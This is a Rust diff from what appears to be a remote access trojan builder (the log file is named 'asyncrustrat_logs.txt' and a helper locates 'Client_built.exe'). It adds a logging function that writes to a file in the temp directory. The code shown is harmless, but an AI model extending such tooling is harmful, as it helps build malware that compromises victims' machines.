@@ -3,6 +3,7 @@ use std::path::{Path, PathBuf};
 use std::process::Command;
 use serde::{Deserialize, Serialize};
 use tauri::{AppHandle};
+use std::io::{Write, BufWriter};
 
 pub fn get_exe_dir() -> Result<PathBuf, String> {
     let current_exe_path = std::env::current_exe()
@@ -85,4 +86,28 @@ pub fn get_client_built_exe_path() -> Result<PathBuf, String> {
     let path = exe_dir.join("Client_built.exe");
 
     Ok(path)
+}
+
+pub fn log_to_file(message: &str) {
+    let log_file_name = "asyncrustrat_logs.txt";
+    let temp_dir = std::env::temp_dir(); // Gets the system's temporary directory (e.g., %TEMP%)
+    let log_file_path = temp_dir.join(log_file_name);
+
+    let file = std::fs::OpenOptions::new()
+        .append(true)
+        .create(true)
+        .open(&log_file_path);
+
+    match file {
+        Ok(f) => {
+            let mut writer = BufWriter::new(f);
+            if let Err(e) = writeln!(writer, "{}", message) {
+                eprintln!("ERROR: Could not write to log file {:?}: {}", log_file_path, e);
+            }
+            if let Err(e) = writer.flush() {
+                eprintln!("ERROR: Could not flush log file {:?}: {}", log_file_path, e);
+            }
+        },
+        Err(e) => eprintln!("ERROR: Could not open log file {:?}: {}", log_file_path, e),
+    }
 }
